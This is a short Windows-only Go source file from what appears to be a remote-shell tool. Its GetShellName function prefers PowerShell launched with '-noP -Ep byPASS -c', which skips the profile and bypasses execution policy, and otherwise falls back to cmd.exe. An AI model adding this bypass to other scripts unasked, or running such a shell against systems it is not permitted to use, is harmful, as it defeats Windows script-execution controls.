//go:build windows

package main

import (
	"github.com/s-christian/gollehs/lib/system"
)

const (
	// Shell constants
	commandPrompt = "C:\\Windows\\System32\\cmd.exe"
	powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
)

func GetShellName() (shell, args string) {
	if system.FileExists(powerShell) {
		shell = powerShell
		args = "-noP -Ep byPASS -c"
	} else {
		shell = commandPrompt
		args = "/c"
	}

	return
}
